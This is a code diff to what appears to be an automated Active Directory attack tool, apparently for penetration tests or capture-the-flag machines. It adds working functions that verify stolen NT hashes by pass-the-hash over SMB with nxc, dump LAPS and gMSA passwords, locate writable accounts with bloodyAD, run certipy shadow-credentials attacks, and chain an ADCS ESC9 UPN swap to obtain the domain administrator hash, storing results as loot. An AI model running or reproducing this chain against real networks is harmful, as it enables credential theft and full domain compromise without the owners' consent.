@@ -85,7 +85,7 @@ def _adcs_esc4_restore(
 def _adcs_esc_chain(
     ip: str, domain: str, user: str, pw: str,
     ca_name: str, template_name: str, esc_variant: str,
-    runner: Runner, findings: Findings, ws: Workspace,
+    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
 ) -> None:
     """Run the certipy req → auth chain for an ESC1 or ESC4 vulnerable template."""
     exploit_dir = ws.exploit_dir
@@ -166,6 +166,7 @@ def _adcs_esc_chain(
         findings.bullet("Hash saved to `loot/ntlm.hash` — cred-reuse phase will spray it")
         findings.add_summary(f"**ADCS {esc_variant} → administrator NT hash** in `loot/ntlm.hash`")
         print(f"    [+] ADCS {esc_variant}: administrator NT hash obtained")
+        _pth_verify(ip, "administrator", nt_hash, runner, findings, ws, available)
     else:
         findings.note(f"Auth step ran but no NT hash parsed: {_trim(out_auth, lines=10)}")
         print(f"    [!] ADCS {esc_variant}: auth ran but NT hash not found in output")
@@ -173,6 +174,251 @@ def _adcs_esc_chain(
     # ── ESC4: restore template ────────────────────────────────────────────────
     if esc_variant == "ESC4":
         _adcs_esc4_restore(ip, domain, user, pw, template_name, backup_json, runner, findings)
+
+
+def _pth_verify(
+    ip: str, user: str, nt_hash: str,
+    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
+) -> bool:
+    """Test NT hash via nxc SMB pass-the-hash. Returns True if valid."""
+    if "nxc" not in available:
+        return False
+    cmd = ["nxc", "smb", ip, "-u", user, "-H", nt_hash]
+    findings.cmd(" ".join(cmd))
+    out = runner.run(cmd, f"pth_smb_{user}", timeout=30)
+    if "Pwn3d!" in out:
+        ws.add_cred(f"{user}:{nt_hash}")
+        findings.bullet(f"**PTH confirmed: `{user}` is local admin** (Pwn3d!)")
+        findings.add_summary(f"PTH: {user} is local admin via NT hash")
+        print(f"    [+] PTH: {user} is local admin via hash")
+        return True
+    elif "[+]" in out:
+        ws.add_cred(f"{user}:{nt_hash}")
+        findings.bullet(f"**PTH confirmed: `{user}` valid** (SMB)")
+        findings.add_summary(f"PTH: {user} valid via NT hash")
+        print(f"    [+] PTH: {user} valid via hash")
+        return True
+    findings.note(f"PTH: {user} hash not valid for SMB")
+    print(f"    [-] PTH: {user} hash not valid for SMB")
+    return False
+
+
+def _check_laps(
+    ip: str, domain: str, user: str, pw: str,
+    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
+) -> None:
+    if "nxc" not in available:
+        return
+    cmd = ["nxc", "smb", ip, "-u", user, "-p", pw, "-d", domain, "-M", "laps"]
+    findings.h4("LAPS")
+    findings.cmd(" ".join(cmd))
+    out = runner.run(cmd, "creds_laps", timeout=30)
+    findings.code_block(_trim(out, lines=20))
+    for line in out.splitlines():
+        m = re.search(r"Computer:\s*(\S+)\s*,\s*LAPS Password:\s*(\S+)", line)
+        if m:
+            computer, laps_pw = m.group(1).rstrip("$"), m.group(2)
+            ws.add_cred(f"administrator:{laps_pw}")
+            ws.append_hash_file("laps.txt", [f"{computer}:administrator:{laps_pw}"])
+            findings.bullet(f"**LAPS password for `{computer}$`:** `{laps_pw}`")
+            findings.add_summary(f"LAPS: administrator@{computer} password in loot/laps.txt")
+            print(f"    [+] LAPS: {computer}$ → administrator password found")
+
+
+def _check_gmsa(
+    ip: str, domain: str, user: str, pw: str,
+    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
+) -> None:
+    if "nxc" not in available:
+        return
+    cmd = ["nxc", "smb", ip, "-u", user, "-p", pw, "-d", domain, "-M", "gmsa"]
+    findings.h4("gMSA Passwords")
+    findings.cmd(" ".join(cmd))
+    out = runner.run(cmd, "creds_gmsa", timeout=30)
+    findings.code_block(_trim(out, lines=20))
+    for line in out.splitlines():
+        m = re.search(r"Account:\s*(\S+)\s+NTLM:\s*([0-9a-fA-F]{32})", line)
+        if m:
+            acct, nt_hash = m.group(1), m.group(2)
+            ws.add_cred(f"{acct}:{nt_hash}")
+            ws.append_hash_file("ntlm.hash", [f"{acct}:{nt_hash}"])
+            findings.bullet(f"**gMSA NT hash for `{acct}`:** `{nt_hash}`")
+            findings.add_summary(f"gMSA: {acct} NT hash in loot/ntlm.hash")
+            print(f"    [+] gMSA: {acct} NT hash obtained")
+
+
+def _bloodyad_writable(
+    ip: str, domain: str, user: str, pw: str,
+    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
+) -> list[str]:
+    """Return sAMAccountNames of user objects the current user has write access to."""
+    if "bloodyAD" not in available:
+        return []
+    cmd = [
+        "bloodyAD",
+        "--host", ip,
+        "-d", domain,
+        "-u", user,
+        "-p", pw,
+        "get", "writable",
+        "--otype", "USER",
+    ]
+    findings.h4("Writable AD Objects (bloodyAD)")
+    findings.cmd(" ".join(cmd))
+    out = runner.run(cmd, "creds_bloodyad_writable", timeout=60)
+    findings.code_block(_trim(out, lines=40))
+
+    targets: list[str] = []
+    for line in out.splitlines():
+        m = re.search(r"sAMAccountName:\s*(\S+)", line, re.IGNORECASE)
+        if m:
+            sam = m.group(1).strip()
+            if sam and not sam.endswith("$") and sam.lower() != user.lower():
+                targets.append(sam)
+    if targets:
+        findings.bullet(f"**Writable user objects:** {', '.join(f'`{t}`' for t in targets)}")
+        findings.add_summary(f"bloodyAD: GenericWrite over {', '.join(targets)}")
+        print(f"    [+] bloodyAD: writable over {', '.join(targets)}")
+    else:
+        print(f"    [-] bloodyAD: no writable user objects found")
+    return targets
+
+
+def _shadow_creds_chain(
+    ip: str, domain: str, user: str, pw: str,
+    targets: list[str],
+    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
+) -> dict[str, str]:
+    """Run certipy-ad shadow auto against writable targets. Returns {sam: nt_hash}."""
+    if "certipy-ad" not in available or not targets:
+        return {}
+    hashes: dict[str, str] = {}
+    for target in targets:
+        findings.h4(f"Shadow Credentials: {target}")
+        cmd = [
+            "certipy-ad", "shadow", "auto",
+            "-u", f"{user}@{domain}",
+            "-p", pw,
+            "-account", target,
+            "-dc-ip", ip,
+        ]
+        findings.cmd(" ".join(cmd))
+        print(f"    [*] Shadow credentials against {target}...")
+        out = runner.run(cmd, f"creds_shadow_{target}", timeout=90)
+        findings.code_block(_trim(out, lines=30))
+
+        nt_hash: str | None = None
+        for line in out.splitlines():
+            m = re.search(r"NT hash for .+?:\s*([0-9a-fA-F]{32})", line)
+            if m:
+                nt_hash = m.group(1)
+                break
+        if nt_hash:
+            hashes[target] = nt_hash
+            ws.append_hash_file("ntlm.hash", [f"{target}:{nt_hash}"])
+            ws.add_cred(f"{target}:{nt_hash}")
+            findings.bullet(f"**NT hash for `{target}`:** `{nt_hash}`")
+            findings.add_summary(f"Shadow credentials → {target} NT hash in loot/ntlm.hash")
+            print(f"    [+] Shadow creds: {target} NT hash obtained")
+            _pth_verify(ip, target, nt_hash, runner, findings, ws, available)
+        else:
+            errors = _error_lines(out)
+            if errors:
+                findings.note(f"Shadow creds failed for {target}: {errors}")
+            print(f"    [-] Shadow creds: no NT hash for {target}")
+    return hashes
+
+
+def _esc9_chain(
+    ip: str, domain: str, user: str, pw: str,
+    ca_name: str, template_name: str,
+    writable_user: str, writable_hash: str,
+    runner: Runner, findings: Findings, ws: Workspace, available: set[str],
+) -> None:
+    """
+    ESC9: change writable_user UPN → administrator@domain (using attacker creds),
+    request cert as writable_user (via their NT hash from shadow credentials),
+    restore UPN, then auth → administrator NT hash.
+    """
+    exploit_dir = ws.exploit_dir
+    old_upn = f"{writable_user}@{domain}"
+    findings.h4(f"ADCS ESC9: {template_name} via {writable_user}")
+
+    update_cmd = [
+        "certipy-ad", "account", "update",
+        "-u", f"{user}@{domain}",
+        "-p", pw,
+        "-user", writable_user,
+        "-upn", f"administrator@{domain}",
+        "-dc-ip", ip,
+    ]
+    findings.cmd(" ".join(update_cmd))
+    out = runner.run(update_cmd, f"adcs_esc9_upn_set_{writable_user}", timeout=60)
+    if "Successfully" not in out and "updated" not in out.lower():
+        findings.note(f"ESC9: UPN update failed — {_trim(out, lines=3)}")
+        print(f"    [!] ESC9: UPN update failed for {writable_user}")
+        return
+
+    pfx_name = f"esc9_{writable_user}"
+    pfx_path = exploit_dir / f"{pfx_name}.pfx"
+    req_cmd = [
+        "certipy-ad", "req",
+        "-u", f"{writable_user}@{domain}",
+        "-hashes", f":{writable_hash}",
+        "-ca", ca_name,
+        "-template", template_name,
+        "-dc-ip", ip,
+        "-out", str(exploit_dir / pfx_name),
+    ]
+    findings.cmd(" ".join(req_cmd))
+    out_req = runner.run(req_cmd, f"adcs_esc9_req_{writable_user}", timeout=60)
+
+    restore_cmd = [
+        "certipy-ad", "account", "update",
+        "-u", f"{user}@{domain}",
+        "-p", pw,
+        "-user", writable_user,
+        "-upn", old_upn,
+        "-dc-ip", ip,
+    ]
+    findings.cmd(" ".join(restore_cmd))
+    runner.run(restore_cmd, f"adcs_esc9_upn_restore_{writable_user}", timeout=60)
+    findings.note(f"ESC9: UPN for {writable_user} restored to {old_upn}")
+
+    if not pfx_path.exists():
+        findings.note(f"ESC9 cert request failed: {_error_lines(out_req) or _trim(out_req, lines=5)}")
+        print(f"    [!] ESC9: cert request failed for {writable_user}")
+        return
+
+    findings.bullet(f"Certificate obtained → `{pfx_path.relative_to(ws.machine_dir)}`")
+
+    auth_cmd = [
+        "certipy-ad", "auth",
+        "-pfx", str(pfx_path),
+        "-dc-ip", ip,
+        "-domain", domain,
+        "-username", "administrator",
+    ]
+    findings.cmd(" ".join(auth_cmd))
+    out_auth = runner.run(auth_cmd, f"adcs_esc9_auth_{writable_user}", timeout=60)
+
+    nt_hash: str | None = None
+    for line in out_auth.splitlines():
+        m = re.search(r"Got hash for .+?:\s*[0-9a-fA-F:]+:([0-9a-fA-F]{32})", line)
+        if m:
+            nt_hash = m.group(1)
+            break
+
+    if nt_hash:
+        ws.append_hash_file("ntlm.hash", [f"administrator:{nt_hash}"])
+        ws.add_cred(f"administrator:{nt_hash}")
+        findings.bullet(f"**NT hash for administrator (ESC9):** `{nt_hash}`")
+        findings.add_summary(f"**ADCS ESC9 → administrator NT hash** in `loot/ntlm.hash`")
+        print(f"    [+] ESC9: administrator NT hash obtained")
+        _pth_verify(ip, "administrator", nt_hash, runner, findings, ws, available)
+    else:
+        findings.note(f"ESC9 auth ran but no NT hash: {_trim(out_auth, lines=10)}")
+        print(f"    [!] ESC9: auth ran but no NT hash extracted")
 
 
 def _sync_time(ip: str, runner: Runner, findings: Findings, available: set[str]) -> None:
@@ -482,7 +728,23 @@ def _ad_core(
             findings.code_block(errors or _trim(out, lines=20))
             print(f"    [!] BloodHound collection failed")
 
-    # 5. ADCS template enumeration
+    # 5. LAPS / gMSA — read managed account credentials
+    if "nxc" in available:
+        _check_laps(ip, domain, user, pw, runner, findings, ws, available)
+        _check_gmsa(ip, domain, user, pw, runner, findings, ws, available)
+
+    # 6. Writable AD objects — identify GenericWrite targets for shadow creds / ESC9
+    writable_targets = _bloodyad_writable(ip, domain, user, pw, runner, findings, ws, available)
+
+    # 7. Shadow credentials — obtain NT hashes for writable user accounts
+    shadow_hashes: dict[str, str] = {}
+    if writable_targets and "certipy-ad" in available:
+        print(f"    [*] Shadow credentials against {len(writable_targets)} writable user(s)...")
+        shadow_hashes = _shadow_creds_chain(
+            ip, domain, user, pw, writable_targets, runner, findings, ws, available,
+        )
+
+    # 8. ADCS template enumeration
     if "certipy-ad" in available:
         cmd = [
             "certipy-ad", "find",
@@ -505,8 +767,13 @@ def _ad_core(
             for ca_name, tmpl, esc in vuln_templates:
                 findings.add_summary(f"ADCS {esc}: {tmpl} via {ca_name}")
             print(f"    [+] {len(vuln_templates)} vulnerable ADCS template(s) — {len(exploitable)} exploitable")
-            for ca_name, tmpl, esc in exploitable:
-                _adcs_esc_chain(ip, domain, user, pw, ca_name, tmpl, esc, runner, findings, ws)
+            for ca, tmpl, esc in exploitable:
+                _adcs_esc_chain(ip, domain, user, pw, ca, tmpl, esc, runner, findings, ws, available)
+            esc9_templates = [(ca, tmpl) for ca, tmpl, esc in vuln_templates if esc == "ESC9"]
+            if esc9_templates and shadow_hashes:
+                for ca, tmpl in esc9_templates:
+                    for wu, wh in shadow_hashes.items():
+                        _esc9_chain(ip, domain, user, pw, ca, tmpl, wu, wh, runner, findings, ws, available)
         elif re.search(r"Found \d+ enabled certificate template", out):
             # -vulnerable returned nothing despite enabled templates existing — run full scan
             findings.note("No vulnerable templates via -vulnerable filter — running full enabled-template scan")
@@ -529,8 +796,13 @@ def _ad_core(
                 for ca_name, tmpl, esc in vuln_full:
                     findings.add_summary(f"ADCS {esc}: {tmpl} via {ca_name}")
                 print(f"    [+] {len(vuln_full)} vulnerable template(s) in full scan — {len(exploitable_full)} exploitable")
-                for ca_name, tmpl, esc in exploitable_full:
-                    _adcs_esc_chain(ip, domain, user, pw, ca_name, tmpl, esc, runner, findings, ws)
+                for ca, tmpl, esc in exploitable_full:
+                    _adcs_esc_chain(ip, domain, user, pw, ca, tmpl, esc, runner, findings, ws, available)
+                esc9_full = [(ca, tmpl) for ca, tmpl, esc in vuln_full if esc == "ESC9"]
+                if esc9_full and shadow_hashes:
+                    for ca, tmpl in esc9_full:
+                        for wu, wh in shadow_hashes.items():
+                            _esc9_chain(ip, domain, user, pw, ca, tmpl, wu, wh, runner, findings, ws, available)
             else:
                 findings.note("Full ADCS output saved to `loot/certipy_full.json` — review manually for ESC3/ESC9/ESC10")
                 print(f"    [-] No parseable vulnerabilities — check loot/certipy_full.json")
@@ -565,6 +837,11 @@ def _ad_core(
             findings.bullet(f"**{len(hashes)} NTLM hashes** ({added} new) → `loot/ntlm.hash`")
             findings.add_summary(f"{len(hashes)} NTLM hashes dumped — crack with hashcat -m 1000 or pass-the-hash")
             print(f"    [+] {len(hashes)} NTLM hashes dumped ({added} new)")
+            admin_line = next((l for l in hashes if l.lower().startswith("administrator:")), None)
+            if admin_line:
+                m_admin = re.search(r":::([0-9a-fA-F]{32})", admin_line)
+                if m_admin:
+                    _pth_verify(ip, "administrator", m_admin.group(1), runner, findings, ws, available)
         else:
             errors = _error_lines(out)
             if errors:
